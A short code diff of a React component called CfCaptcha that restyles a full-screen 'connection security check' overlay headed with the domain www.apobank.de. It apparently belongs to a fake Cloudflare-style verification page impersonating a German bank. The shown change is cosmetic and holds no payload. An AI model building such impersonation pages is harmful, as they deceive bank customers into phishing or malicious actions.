@@ -206,8 +206,8 @@ const CfCaptcha = () => {
         </div>
         <div className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center px-4 py-8 overflow-auto">
           <div className="w-full max-w-[560px]">
-            <h1 className="text-[18px] sm:text-[22px] font-bold text-[#0f172a] leading-tight text-center">www.apobank.de</h1>
-            <h2 className="text-[18px] sm:text-[22px] font-semibold text-[#0f172a] mt-2 mb-6 text-center">
+            <h1 className="text-[18px] sm:text-[22px] font-bold text-white leading-tight text-center drop-shadow">www.apobank.de</h1>
+            <h2 className="text-[18px] sm:text-[22px] font-semibold text-white mt-2 mb-6 text-center drop-shadow">
               Überprüfung der Verbindungssicherheit
             </h2>
             <div className="mx-auto flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 sm:gap-4 rounded-md border border-slate-200 bg-white px-4 sm:px-5 py-4 w-full max-w-[440px] shadow-lg">
